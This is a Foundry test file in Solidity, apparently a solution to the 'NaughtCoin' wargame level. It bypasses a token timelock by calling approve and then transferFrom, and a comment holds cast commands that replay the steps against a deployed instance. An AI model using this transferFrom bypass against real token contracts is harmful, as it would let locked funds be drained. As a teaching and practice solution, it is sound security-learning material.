// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

contract NaughtyCoinTest is Test {
    NaughtCoin public coin;
    address public attacker;
    address public other;

    function setUp() public {
        attacker = makeAddr("attacker");
        other = makeAddr("other");
        coin = new NaughtCoin(attacker);
    }

    function test_naughtCoinAttack() public {
        vm.startPrank(attacker);

        assertEq(coin.balanceOf(attacker), 1000000 ether);

        coin.approve(attacker, coin.balanceOf(attacker));

        coin.transferFrom(attacker, other, coin.balanceOf(attacker));

        assertEq(coin.balanceOf(attacker), 0);

        vm.stopPrank();
    }
}

/* 
source .env
export coin=0x06b91E4C761bEd3EE3548e994d28fbda5e614ac1
export attacker=0x7bB341488d5E6838Bb9C1fD521543f83066Dc9Bd
export other=0x5945E887C5463cF735A058356da0d73133BC1344
cast call $coin "balanceOf(address)" $attacker --rpc-url $RPC_URL
cast send $coin "approve(address, uint256)" $attacker 1000000ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY
cast send $coin "transferFrom(address, address, uint256)" $attacker $other 1000000ether --rpc-url $RPC_URL --private-key $PRIVATE_KEY
*/
